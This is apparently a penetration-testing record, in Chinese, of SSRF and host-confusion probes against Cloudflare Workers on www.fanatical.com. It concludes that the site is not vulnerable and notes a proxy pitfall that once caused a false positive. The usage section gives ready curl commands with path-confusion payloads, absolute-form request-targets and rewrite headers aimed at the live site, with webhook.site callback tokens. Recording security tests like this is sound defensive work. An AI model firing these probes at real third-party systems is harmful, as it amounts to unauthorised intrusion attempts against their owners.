# Fanatical www/da-pre/blog-api Cloudflare Worker 路径 host 混淆 SSRF 阴性（含绝对形式 request-target 的本地代理陷阱）

- **code**: fanatical-worker-path-hostconfusion-ssrf-negative
- **kind**: poc
- **category**: ssrf
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-11 实测于 www.fanatical.com（CF 104.20.19.144，--noproxy --path-as-is）：//example.com/ → 301 同宿主 /en//example.com/；/api//webhook.site/<tok>、/api/%2f%2f<host>、/api/@<host>、/api/\<host>、/api/http:%2f%2f<host> → 404/0B（via heroku-router）；..%2f 变体 → CF 400/155B；绝对形式 request-target → CF 403/553B；X-Original-URL/X-Rewrite-URL → CF 403/4549B；X-Forwarded-Host/Forwarded/X-Forwarded-Server → 响应不变。webhook.site 唯一 token 收件箱零条来自 CF/Heroku 出口。da-pre /api//example.com → 404 {"error":"Path not found"}；blog-api → 403 {"message":"Missing Authentication Token"}。
- **tags**: fanatical,cloudflare-worker,ssrf,open-proxy,path-confusion,negative
- **created_at**: 2026-11-11T21:28:51.559Z
- **engine**: www.fanatical.com
- **found_by**: work

## 描述

验证 Cloudflare Worker 把用户可控 pathname 拼进上游 fetch 时能否发生 host 混淆（//host、%2f%2f、..%2f、@host、反斜杠、http:%2f%2f、绝对形式 request-target、X-Original-URL/X-Rewrite-URL/X-Forwarded-Host）。结论：三站 Worker 均以白名单/前缀路由先行判定，未命中即 404，命中则原样转发既有源站，未用 pathname 重建外部 host。

## 用法

```
复测口径（务必直连，别走本机记录代理）：
1) curl -sk --noproxy '*' --path-as-is 'https://www.fanatical.com/api//webhook.site/<tok>' → 404/0B 且带 via: 2.0 heroku-router；
2) curl -sk --noproxy '*' --path-as-is 'https://www.fanatical.com//example.com/' → 301 到 https://www.fanatical.com/en//example.com/（同宿主，非 Example Domain）；
3) curl -sk --noproxy '*' --http1.1 --request-target 'http://webhook.site/<tok>/' https://www.fanatical.com/ → CF 403/553B；
4) 头变体 X-Original-URL/X-Rewrite-URL 被 CF WAF 403/4549B；X-Forwarded-Host 在 /api/all/en 与 /api/blog-feed 上无回显无回连。
陷阱：绝对形式 request-target 若经平台记录 MITM 代理，会被代理按绝对 URI 改道到 sink（此前误判成「命中」）；判断回连必须比对 webhook 收件 IP 与本机出口 IP，Worker 侧回连会来自 CF/Heroku 网段。
```
